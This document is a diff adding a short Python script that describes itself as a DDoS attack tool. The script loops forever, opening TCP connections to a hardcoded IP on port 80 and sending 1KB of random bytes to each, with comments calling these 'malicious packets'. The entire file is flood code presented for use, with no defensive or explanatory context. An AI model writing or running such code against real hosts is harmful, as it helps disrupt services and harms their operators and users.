@@ -1,0 +1,40 @@
+import socket
+import random
+import time  # Import the time module
+
+# Define the target and port
+target_ip = '192.168.11.1'  # Change the target IP address
+target_port = 80
+
+# Craft a malicious packet
+def craft_packet():
+    # Generate a random payload
+    payload = bytes(random._urandom(1024))
+    
+    # Create a socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    try:
+        # Connect to the target
+        s.connect((target_ip, target_port))
+        
+        # Send the malicious payload
+        s.send(payload)
+        print("Packet sent successfully.")
+    except socket.error as e:
+        print("Error sending packet:", str(e))
+    finally:
+        # Close the socket
+        s.close()
+
+# Initiate a DDoS attack
+def ddos_attack():
+    print("Initiating DDoS attack on", target_ip)
+    while True:
+        # Craft and send malicious packets
+        craft_packet()
+        time.sleep(0.1)  # Introduce a sleep interval of 0.1 seconds
+
+# Run the DDoS attack
+if __name__ == "__main__":
+    ddos_attack()
